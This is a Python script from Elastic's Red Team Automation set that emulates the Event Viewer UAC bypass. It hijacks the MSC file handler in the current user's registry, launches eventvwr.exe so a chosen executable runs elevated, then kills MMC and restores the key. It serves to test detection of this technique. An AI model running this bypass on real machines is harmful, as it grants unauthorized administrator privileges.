# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License;
# you may not use this file except in compliance with the Elastic License.

# Name: Bypass UAC via Event Viewer
# RTA: uac_eventviewer.py
# ATT&CK: T1088
# Description: Modifies the Registry value to change the handler for MSC files, bypassing UAC.

import sys
import time

from . import common


# Default machine value:
# HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
# %SystemRoot%\system32\mmc.exe "%1" %*


@common.requires_os(common.WINDOWS)
def main(target_file=common.get_path("bin", "myapp.exe")):
    winreg = common.get_winreg()
    common.log("Bypass UAC with %s" % target_file)

    common.log("Writing registry key")
    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
    winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)

    common.log("Running event viewer")
    common.execute(["c:\\windows\\system32\\eventvwr.exe"])

    time.sleep(3)
    common.log("Killing MMC", log_type="!")
    common.execute(['taskkill', '/f', '/im', 'mmc.exe'])

    common.log("Restoring registry key", log_type="-")
    winreg.DeleteValue(hkey, "")
    winreg.DeleteKey(hkey, "")
    winreg.CloseKey(hkey)


if __name__ == "__main__":
    exit(main(*sys.argv[1:]))
